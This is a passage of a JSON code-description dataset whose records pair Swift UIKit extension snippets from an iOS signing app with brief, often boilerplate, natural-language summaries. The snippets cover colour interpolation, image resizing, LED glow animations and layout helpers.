    "code": "static func interpolate(from: UIColor, to: UIColor, with alpha: CGFloat) -> UIColor {\nvar fromRed: CGFloat = 0, fromGreen: CGFloat = 0, fromBlue: CGFloat = 0, fromAlpha: CGFloat = 0\nfrom.getRed(&fromRed, green: &fromGreen, blue: &fromBlue, alpha: &fromAlpha)\n\nvar toRed: CGFloat = 0, toGreen: CGFloat = 0, toBlue: CGFloat = 0, toAlpha: CGFloat = 0\nto.getRed(&toRed, green: &toGreen, blue: &toBlue, alpha: &toAlpha)\n\nlet interpolatedRed = fromRed + (toRed - fromRed) * alpha\nlet interpolatedGreen = fromGreen + (toGreen - fromGreen) * alpha\nlet interpolatedBlue = fromBlue + (toBlue - fromBlue) * alpha",
    "nl": "Function interpolate - implements interpolate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIColor+hex.swift",
    "code_type": "function"
  },
  {
    "id": "1450",
    "code": "public extension UIColor {\n/// Creates a color object that responds to `userInterfaceStyle` trait changes.\nconvenience init(light: UIColor, dark: UIColor) {",
    "nl": "https://stackoverflow.com/a/69345997",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIColor+hex.swift",
    "code_type": "extension"
  },
  {
    "id": "1451",
    "code": "extension UIControl {\n/// Apply a configuration to a UIControl and return it (builder pattern)\n/// - Parameter configuration: Configuration closure to apply to this control\n/// - Returns: Self for chaining\n@discardableResult\nfunc apply(_ configuration: (Self) -> Void) -> Self {",
    "nl": "extension UIControl - implements functionality related to u i control",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIControl+Apply.swift",
    "code_type": "extension"
  },
  {
    "id": "1452",
    "code": "func apply(_ configuration: (Self) -> Void) -> Self {\n// Apply the configuration to self\nconfiguration(self)\n// Return self for chaining\nreturn self\n}\n}\n",
    "nl": "Function apply - implements apply functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIControl+Apply.swift",
    "code_type": "function"
  },
  {
    "id": "1453",
    "code": "extension UIImage {\nfunc resizeToSquare() -> UIImage? {",
    "nl": "extension UIImage - implements functionality related to u i image",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIImage+resize.swift",
    "code_type": "extension"
  },
  {
    "id": "1454",
    "code": "func resizeToSquare() -> UIImage? {\n// Determine the size for the square\nlet size = min(self.size.width, self.size.height)\nlet rect = CGRect(x: (self.size.width - size) / 2,\ny: (self.size.height - size) / 2,\nwidth: size,\nheight: size)\n\n// Create a new graphics context with the square size\nUIGraphicsBeginImageContextWithOptions(CGSize(width: size, height: size), false, scale)",
    "nl": "Function resizeToSquare - implements resizetosquare functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIImage+resize.swift",
    "code_type": "function"
  },
  {
    "id": "1455",
    "code": "public extension UIImage {\n/// Resize image while keeping the aspect ratio. Original image is not modified.\n/// - Parameters:\n///   - width: A new width in pixels.\n///   - height: A new height in pixels.\n/// - Returns: Resized image.\nfunc resize(_ width: Int, _ height: Int) -> UIImage {",
    "nl": "extension UIImage - implements functionality related to u i image",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIImage+resize.swift",
    "code_type": "extension"
  },
  {
    "id": "1456",
    "code": "func resize(_ width: Int, _ height: Int) -> UIImage {\n// Keep aspect ratio\nlet maxSize = CGSize(width: width, height: height)\n\nlet availableRect = AVFoundation.AVMakeRect(\naspectRatio: size,\ninsideRect: .init(origin: .zero, size: maxSize)\n)\nlet targetSize = availableRect.size\n",
    "nl": "/ Resize image while keeping the aspect ratio. Original image is not modified. / - Parameters: /   - width: A new width in pixels. /   - height: A new height in pixels. / - Returns: Resized image.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIImage+resize.swift",
    "code_type": "function"
  },
  {
    "id": "1457",
    "code": "extension UINavigationController {\nfunc shouldPresentFullScreen() {",
    "nl": "extension UINavigationController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UINavigationController+shouldPresentFullscreen.swift",
    "code_type": "extension"
  },
  {
    "id": "1458",
    "code": "func shouldPresentFullScreen() {\nif UIDevice.current.userInterfaceIdiom == .pad {",
    "nl": "Function shouldPresentFullScreen - implements shouldpresentfullscreen functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UINavigationController+shouldPresentFullscreen.swift",
    "code_type": "function"
  },
  {
    "id": "1459",
    "code": "extension UITabBar {\n/// Add LED effect to the tab bar with simplified parameters\n/// With improved error handling to prevent crashes\n@objc func addTabBarLEDEffect(color: UIColor) {",
    "nl": "extension UITabBar - implements functionality related to u i tab bar",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UITabBar+LED.swift",
    "code_type": "extension"
  },
  {
    "id": "1460",
    "code": "@objc func addTabBarLEDEffect(color: UIColor) {\n// Skip adding effects if not in view hierarchy or not visible\nguard window != nil, !isHidden, superview != nil else {",
    "nl": "/ Add LED effect to the tab bar with simplified parameters / With improved error handling to prevent crashes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UITabBar+LED.swift",
    "code_type": "function"
  },
  {
    "id": "1461",
    "code": "extension UIUserInterfaceStyle: @retroactive CaseIterable {\npublic static var allCases: [UIUserInterfaceStyle] = [.unspecified, .dark, .light]\nvar description: String {",
    "nl": "extension UIUserInterfaceStyle - implements functionality related to u i user interface style",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIUserInterfaceStyle+allCases.swift",
    "code_type": "extension"
  },
  {
    "id": "1462",
    "code": "extension UIView {\n/// Applies an LED effect to text fields in the entitlements editor\nfunc applyEntitlementFieldStyle() {",
    "nl": "/ Extension to add LED-style effects to entitlements editor UI components",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+EntitlementsEditor.swift",
    "code_type": "extension"
  },
  {
    "id": "1463",
    "code": "func applyEntitlementFieldStyle() {\n// Apply corner radius\nlayer.cornerRadius = 8\nclipsToBounds = true\n\n// Apply border with LED effect\nlayer.borderWidth = 1.0\n\n// Create glowing border color animation\nlet glowAnimation = CABasicAnimation(keyPath: \"borderColor\")",
    "nl": "/ Applies an LED effect to text fields in the entitlements editor",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+EntitlementsEditor.swift",
    "code_type": "function"
  },
  {
    "id": "1464",
    "code": "func applyEntitlementButtonStyle() {\n// Apply general styling\nlayer.cornerRadius = 8\nclipsToBounds = true\n\n// Create background color animation for subtle pulsing effect\nlet pulseAnimation = CABasicAnimation(keyPath: \"backgroundColor\")\npulseAnimation.fromValue = UIColor.systemBlue.withAlphaComponent(0.7).cgColor\npulseAnimation.toValue = UIColor.systemBlue.withAlphaComponent(0.9).cgColor\npulseAnimation.duration = 1.2",
    "nl": "/ Applies an LED effect to buttons in the entitlements editor",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+EntitlementsEditor.swift",
    "code_type": "function"
  },
  {
    "id": "1465",
    "code": "func applyEntitlementHeaderStyle() {\n// Apply corner radius\nlayer.cornerRadius = 6\n\n// Create subtle background glow\nlet gradientLayer = CAGradientLayer()\ngradientLayer.frame = bounds\ngradientLayer.colors = [\nUIColor.systemBlue.withAlphaComponent(0.1).cgColor,\nUIColor.systemBlue.withAlphaComponent(0.2).cgColor,",
    "nl": "/ Applies an LED header style for section headers in the entitlements editor",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+EntitlementsEditor.swift",
    "code_type": "function"
  },
  {
    "id": "1466",
    "code": "func showValidationEffect(isValid: Bool) {\n// Remove any existing animations\nlayer.removeAnimation(forKey: \"validationEffect\")\n\n// Set colors based on validity\nlet color = isValid ? UIColor.systemGreen : UIColor.systemRed\n\n// Create pulsing animation\nlet pulseAnimation = CABasicAnimation(keyPath: \"borderColor\")\npulseAnimation.fromValue = color.withAlphaComponent(0.4).cgColor",
    "nl": "/ Adds a validation effect to show whether an entitlement is valid",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+EntitlementsEditor.swift",
    "code_type": "function"
  },
  {
    "id": "1467",
    "code": "extension UIView {\n/// Find the view controller that contains this view\nfunc findViewController() -> UIViewController? {",
    "nl": "extension UIView - UI component for display and interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Extension.swift",
    "code_type": "extension"
  },
  {
    "id": "1468",
    "code": "func findViewController() -> UIViewController? {\nvar responder: UIResponder? = self\nwhile let nextResponder = responder?.next {",
    "nl": "/ Find the view controller that contains this view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Extension.swift",
    "code_type": "function"
  },
  {
    "id": "1469",
    "code": "extension UILabel {\n/// Add padding to a UILabel\nvar padding: UIEdgeInsets {",
    "nl": "extension UILabel - implements functionality related to u i label",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Extension.swift",
    "code_type": "extension"
  },
  {
    "id": "1470",
    "code": "extension UIEdgeInsets {\nfunc inverted() -> UIEdgeInsets {",
    "nl": "extension UIEdgeInsets - implements functionality related to u i edge insets",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Extension.swift",
    "code_type": "extension"
  },
  {
    "id": "1471",
    "code": "func inverted() -> UIEdgeInsets {\nreturn UIEdgeInsets(\ntop: -top,\nleft: -left,\nbottom: -bottom,\nright: -right\n)\n}\n}\n",
    "nl": "Function inverted - implements inverted functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Extension.swift",
    "code_type": "function"
  },
  {
    "id": "1472",
    "code": "extension UIView {\n// MARK: - Properties\n\n/// The LED gradient layer - stored as associated object\nprivate var ledGradientLayer: CAGradientLayer? {",
    "nl": "/ Extension for adding LED lighting effects to UIView elements",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "extension"
  },
  {
    "id": "1473",
    "code": "func addLEDEffect(\ncolor: UIColor,\nintensity: CGFloat = 0.6,\nspread: CGFloat = 10,\nanimated: Bool = true,\nanimationDuration: TimeInterval = 2.0\n) {",
    "nl": "MARK: - Public Methods / Add a soft LED glow effect to the view / - Parameters: /   - color: The main color of the LED effect /   - intensity: Glow intensity (0.0-1.0, default: 0.6) /   - spread: How far the glow spreads (points, default: 10) /   - animated: Whether the glow should pulsate (default: true) /   - animationDuration: Duration of pulse animation if animated (default: 2.0)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "function"
  },
  {
    "id": "1474",
    "code": "@objc func addFlowingLEDEffect(\ncolor: UIColor,\nintensity: CGFloat = 0.8,\nwidth: CGFloat = 5,\nspeed: TimeInterval = 2.0\n) {",
    "nl": "/ Add a flowing LED effect that follows the outline of the view / - Parameters: /   - color: The main color of the LED effect /   - intensity: Glow intensity (0.0-1.0, default: 0.8) /   - width: Width of the flowing LED effect (default: 5) /   - speed: Animation speed - lower is faster (default: 2.0)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "function"
  },
  {
    "id": "1475",
    "code": "func removeLEDEffect() {\nledGradientLayer?.removeFromSuperlayer()\nledGradientLayer = nil\n// Simply set the animation group to nil - it doesn't have a removeAllAnimations method\nledAnimationGroup = nil\n}\n\n// MARK: - Private Helper Methods\n\n/// Update LED layer position when frame changes",
    "nl": "/ Remove any LED lighting effects from the view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "function"
  },
  {
    "id": "1476",
    "code": "private func updateLEDLayerPosition() {\nguard let ledLayer = ledGradientLayer else { return }",
    "nl": "MARK: - Private Helper Methods / Update LED layer position when frame changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "function"
  },
  {
    "id": "1477",
    "code": "private func addLEDAnimation(duration: TimeInterval, intensity: CGFloat) {\nguard let ledLayer = ledGradientLayer else { return }",
    "nl": "/ Add pulsating animation to the LED effect",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "function"
  },
  {
    "id": "1478",
    "code": "private func animateFlowingLED(speed: TimeInterval) {\nguard let ledLayer = ledGradientLayer else { return }",
    "nl": "/ Animate the flowing LED effect",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "function"
  },
  {
    "id": "1479",
    "code": "private enum AssociatedKeys {\nstatic var ledGradientLayer: UnsafeRawPointer = .init(bitPattern: \"ledGradientLayer\".hashValue)!\nstatic var ledAnimationGroup: UnsafeRawPointer = .init(bitPattern: \"ledAnimationGroup\".hashValue)!\n}\n}\n\n// Convenience method for applying LED effects to UIButton\nextension UIButton {",
    "nl": "MARK: - Associated Objects Keys",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "enum"
  },
  {
    "id": "1480",
    "code": "extension UIButton {\n/// Add LED effect to button with appropriate settings\n/// - Parameter color: The color of the LED effect (default: tint color)\nfunc addButtonLEDEffect(color: UIColor? = nil) {",
    "nl": "Convenience method for applying LED effects to UIButton",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "extension"
  },
  {
    "id": "1481",
    "code": "func addButtonLEDEffect(color: UIColor? = nil) {\nlet effectColor = color ?? tintColor ?? .systemBlue\naddLEDEffect(\ncolor: effectColor,\nintensity: 0.5,\nspread: 12,\nanimated: true,\nanimationDuration: 2.0\n)\n}",
    "nl": "/ Add LED effect to button with appropriate settings / - Parameter color: The color of the LED effect (default: tint color)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "function"
  },
  {
    "id": "1482",
    "code": "func addButtonFlowingLEDEffect(color: UIColor? = nil) {\nlet effectColor = color ?? tintColor ?? .systemBlue\naddFlowingLEDEffect(\ncolor: effectColor,\nintensity: 0.7,\nwidth: 3,\nspeed: 3.0\n)\n}\n}",
    "nl": "/ Add flowing LED border to button / - Parameter color: The color of the LED effect (default: tint color)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "function"
  },
  {
    "id": "1483",
    "code": "extension UITabBar {\n/// Add a flowing LED effect around the tab bar\n/// - Parameter color: The color of the effect (default: tint color)\nfunc addTabBarLEDEffect(color: UIColor? = nil) {",
    "nl": "Convenience methods for applying LED effects to UITabBar",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "extension"
  },
  {
    "id": "1484",
    "code": "func addTabBarLEDEffect(color: UIColor? = nil) {\nlet effectColor = color ?? tintColor ?? .systemBlue\naddFlowingLEDEffect(\ncolor: effectColor,\nintensity: 0.6,\nwidth: 2,\nspeed: 4.0\n)\n}\n}",
    "nl": "/ Add a flowing LED effect around the tab bar / - Parameter color: The color of the effect (default: tint color)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "function"
  },
  {
    "id": "1485",
    "code": "extension UITableViewCell {\n/// Add subtle LED effect to highlight important cells\n/// - Parameter color: The color of the LED effect\nfunc addCellLEDEffect(color: UIColor) {",
    "nl": "Convenience methods for table view cells",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "extension"
  },
  {
    "id": "1486",
    "code": "func addCellLEDEffect(color: UIColor) {\ncontentView.addLEDEffect(\ncolor: color,\nintensity: 0.3,\nspread: 15,\nanimated: true,\nanimationDuration: 3.0\n)\n}\n}",
    "nl": "/ Add subtle LED effect to highlight important cells / - Parameter color: The color of the LED effect",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift",
    "code_type": "function"
  },
  {
    "id": "1487",
    "code": "extension UIView {\n/// Apply modern card styling to a view\n/// - Parameters:\n///   - backgroundColor: The background color of the card\n///   - cornerRadius: The corner radius (default: 12)\n///   - shadowEnabled: Whether to add a shadow (default: true)\n///   - shadowIntensity: How strong the shadow should be (default: 0.2)\nfunc applyCardStyle(\nbackgroundColor: UIColor? = nil,\ncornerRadius: CGFloat = 12,",
    "nl": "extension UIView - UI component for display and interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift",
    "code_type": "extension"
  },
  {
    "id": "1488",
    "code": "func applyCardStyle(\nbackgroundColor: UIColor? = nil,\ncornerRadius: CGFloat = 12,\nshadowEnabled: Bool = true,\nshadowIntensity: CGFloat = 0.2\n) {",
    "nl": "/ Apply modern card styling to a view / - Parameters: /   - backgroundColor: The background color of the card /   - cornerRadius: The corner radius (default: 12) /   - shadowEnabled: Whether to add a shadow (default: true) /   - shadowIntensity: How strong the shadow should be (default: 0.2)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1489",
    "code": "func addBounceAnimation(duration: TimeInterval = 0.3) {\nUIView.animate(withDuration: duration / 2, animations: {",
    "nl": "/ Add a subtle bounce animation to a view / - Parameter duration: The duration of the animation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1490",
    "code": "func addPulseAnimation(duration: TimeInterval = 1.5, minScale _: CGFloat = 0.97, maxScale: CGFloat = 1.03) {\nUIView.animate(withDuration: duration / 2, delay: 0, options: [.autoreverse, .repeat], animations: {",
    "nl": "/ Add a soft pulsing animation to draw attention to a view / - Parameters: /   - duration: Duration of each pulse /   - minScale: Minimum scale factor during pulse /   - maxScale: Maximum scale factor during pulse",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1491",
    "code": "func stopAnimations() {\nlayer.removeAllAnimations()\ntransform = .identity\n}\n\n/// Add a gradient overlay to the view\n/// - Parameters:\n///   - colors: Array of colors to use in the gradient\n///   - direction: Direction of the gradient\n///   - locations: Optional array of locations for the gradient stops",
    "nl": "/ Stops any current animations on the view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1492",
    "code": "func addGradientBackground(\ncolors: [UIColor],\ndirection: GradientDirection = .topToBottom,\nlocations: [NSNumber]? = nil\n) {",
    "nl": "/ Add a gradient overlay to the view / - Parameters: /   - colors: Array of colors to use in the gradient /   - direction: Direction of the gradient /   - locations: Optional array of locations for the gradient stops",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1493",
    "code": "enum GradientDirection {\ncase leftToRight\ncase rightToLeft\ncase topToBottom\ncase bottomToTop\ncase topLeftToBottomRight\ncase bottomRightToTopLeft\n}\n\n/// Add a glass-like blur effect to the view",
    "nl": "/ Direction options for gradients",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift",
    "code_type": "enum"
  },
  {
    "id": "1494",
    "code": "func addGlassEffect(\nstyle: UIBlurEffect.Style = .systemUltraThinMaterial,\ncornerRadius: CGFloat = 0,\nalpha: CGFloat = 1.0\n) {",
    "nl": "/ Add a glass-like blur effect to the view / - Parameters: /   - style: The blur style to use /   - cornerRadius: Corner radius for the blur view /   - alpha: Opacity of the blur effect",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1495",
    "code": "func roundCorners(corners: UIRectCorner, radius: CGFloat) {\nlet path = UIBezierPath(\nroundedRect: bounds,\nbyRoundingCorners: corners,\ncornerRadii: CGSize(width: radius, height: radius)\n)\n\nlet maskLayer = CAShapeLayer()\nmaskLayer.path = path.cgPath\nlayer.mask = maskLayer",
    "nl": "/ Round specific corners of the view / - Parameters: /   - corners: Which corners to round /   - radius: The corner radius",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1496",
    "code": "func addBorder(color: UIColor, width: CGFloat = 1.0) {\nlayer.borderColor = color.cgColor\nlayer.borderWidth = width\n}\n\n/// Add parallax effect to the view (subtle movement in response to device tilting)\nfunc addParallaxEffect(amount: CGFloat = 10) {",
    "nl": "/ Add a subtle border to the view / - Parameters: /   - color: The border color /   - width: The border width",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1497",
    "code": "func addParallaxEffect(amount: CGFloat = 10) {\n// Remove any existing motion effects\nmotionEffects.forEach { removeMotionEffect($0) }",
    "nl": "/ Add parallax effect to the view (subtle movement in response to device tilting)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1498",
    "code": "func applyBadgeStyle(backgroundColor: UIColor, textColor: UIColor? = nil) {\nself.backgroundColor = backgroundColor\nlayer.cornerRadius = bounds.height / 2\nclipsToBounds = true\n\n// Apply minimum size\nif bounds.width < bounds.height {",
    "nl": "/ Convert this view into a modern badge style / - Parameters: /   - backgroundColor: The badge background color /   - textColor: The text color (if containing a label)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1499",
    "code": "extension UIView {\n/// Add and setup constraints for a child view in a single call\n/// - Parameters:\n///   - child: Child view to add\n///   - setup: Closure for configuring constraints\nfunc addSubviewWithConstraints(_ child: UIView, setup: (UIView) -> [NSLayoutConstraint]) {",
    "nl": "MARK: - UIView Extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "extension"
  },
  {
    "id": "1500",
    "code": "func addSubviewWithConstraints(_ child: UIView, setup: (UIView) -> [NSLayoutConstraint]) {\nchild.translatesAutoresizingMaskIntoConstraints = false\naddSubview(child)\nNSLayoutConstraint.activate(setup(child))\n}\n\n/// Create a stack of views with equal spacing\n/// - Parameters:\n///   - views: Views to include in the stack\n///   - axis: Stack axis (horizontal or vertical)",
    "nl": "/ Add and setup constraints for a child view in a single call / - Parameters: /   - child: Child view to add /   - setup: Closure for configuring constraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1501",
    "code": "func createStack(\nwith views: [UIView],\naxis: NSLayoutConstraint.Axis,\nspacing: CGFloat = 8,\ndistribution: UIStackView.Distribution = .fill,\nalignment: UIStackView.Alignment = .fill\n) -> UIStackView {",
    "nl": "/ Create a stack of views with equal spacing / - Parameters: /   - views: Views to include in the stack /   - axis: Stack axis (horizontal or vertical) /   - spacing: Spacing between views /   - distribution: Distribution type /   - alignment: Alignment type / - Returns: Configured stack view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1502",
    "code": "func addLoadingIndicator(text: String? = nil, style: UIActivityIndicatorView.Style = .large) -> UIView {\n// Create container\nlet container = UIView()\ncontainer.backgroundColor = UIColor.black.withAlphaComponent(0.3)\ncontainer.translatesAutoresizingMaskIntoConstraints = false\naddSubview(container)\n\nNSLayoutConstraint.activate([\ncontainer.leadingAnchor.constraint(equalTo: leadingAnchor),\ncontainer.trailingAnchor.constraint(equalTo: trailingAnchor),",
    "nl": "/ Add a loading indicator with optional text / - Parameters: /   - text: Optional loading text /   - style: Activity indicator style / - Returns: The container view that can be removed later",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1503",
    "code": "func addAnimatedIcon(\nsystemName: String,\ntintColor: UIColor = .systemBlue,\nsize: CGSize = CGSize(width: 100, height: 100)\n) -> UIImageView {",
    "nl": "/ Add an animated icon as a child view (replacement for Lottie) / - Parameters: /   - systemName: SF Symbol name /   - tintColor: Icon tint color /   - size: Size for the icon / - Returns: The configured image view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1504",
    "code": "func applyCardStyling(\ncornerRadius: CGFloat = 16,\nshadowOpacity: Float = 0.1,\nbackgroundColor: UIColor = .systemBackground\n) {",
    "nl": "/ Apply elegant card styling to the view / - Parameters: /   - cornerRadius: Corner radius for the card /   - shadowOpacity: Shadow opacity (0-1) /   - backgroundColor: Background color",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1505",
    "code": "func addViewGradientBackground(\ncolors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],\nstartPoint: CGPoint = CGPoint.zero,\nendPoint: CGPoint = CGPoint(x: 1, y: 1)\n) {",
    "nl": "/ Add a gradient background to the view / - Parameters: /   - colors: Gradient colors /   - startPoint: Start point (default top-left) /   - endPoint: End point (default bottom-right)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1506",
    "code": "func addGradientBackground(\ncolors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],\nstartPoint: CGPoint = CGPoint.zero,\nendPoint: CGPoint = CGPoint(x: 1, y: 1)\n) {",
    "nl": "Function addGradientBackground - implements addgradientbackground functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1507",
    "code": "func applyFuturisticShadow() {\nlayer.applyBlueTintedShadow()\n}\n}\n\n// MARK: - UIButton Extensions\n\nextension UIButton {",
    "nl": "/ Apply futuristic shadow effect to the view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1508",
